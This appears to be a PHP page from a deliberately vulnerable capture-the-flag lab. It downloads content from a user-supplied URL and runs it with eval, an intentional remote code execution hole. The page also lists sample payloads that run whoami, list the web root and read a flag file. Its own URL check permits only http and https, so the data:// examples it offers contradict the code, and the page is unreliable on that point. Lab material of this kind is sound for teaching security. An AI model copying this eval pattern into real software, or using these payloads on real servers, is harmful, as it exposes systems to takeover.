<?php

if(isset($_GET['url'])){
    $url = $_GET['url'];
    
    // Simple validation - only allow http/https
    if(!filter_var($url, FILTER_VALIDATE_URL) || 
       (!str_starts_with($url, 'http://') && !str_starts_with($url, 'https://'))){
        die('Invalid URL format');
    }
    
    // Direct RCE - fetch content and execute it
    $content = file_get_contents($url);
    
    echo "<h3>Content from URL:</h3>";
    echo "<pre>" . htmlspecialchars($content) . "</pre>";
    
    // Execute PHP code if found
    if(strpos($content, '<?php') !== false || strpos($content, '<?=') !== false){
        echo "<h3>Executing PHP code:</h3>";
        echo "<div style='background: #ffcccc; padding: 10px; border: 1px solid red;'>";
        
        // Direct execution
        eval('?>' . $content);
        
        echo "</div>";
    }
}

?>
<html>
<body>
<center><h1>LEVEL 7 - PHP CODE EXECUTION</h1></center>
<br><br>
<center>
<h2>Simple PHP Code Execution via SSRF</h2>
<p>This level demonstrates direct PHP code execution through SSRF</p>
</center>

<br><br><br><br><br>
<center>
<form action='.' method='GET'>
ENTER URL:<br>
<input type='text' name='url' style='width: 400px;' placeholder='http://example.com/script.php'>
<br><br>
<input type='submit' value='Execute'>
</center>
</form>

<br><br>
<center>
<h3>Examples:</h3>
<div style='text-align: left; max-width: 600px; background: #f0f0f0; padding: 10px; border-radius: 5px;'>
<strong>1. Execute system commands:</strong><br>
<code>data://text/plain,<?php system("whoami"); ?></code><br><br>

<strong>2. Read flag:</strong><br>
<code>data://text/plain,<?php echo file_get_contents("/var/www/html/flag/flag.php"); ?></code><br><br>

<strong>3. List files:</strong><br>
<code>data://text/plain,<?php system("ls -la /var/www/html/"); ?></code><br><br>

<strong>4. Execute local PHP:</strong><br>
<code>http://localhost:8081/flag/flag.php</code>
</div>
</center>

<br><br>
<center>
<a href="../index.php">← Back to Main Menu</a>
</center>

</body>
</html>
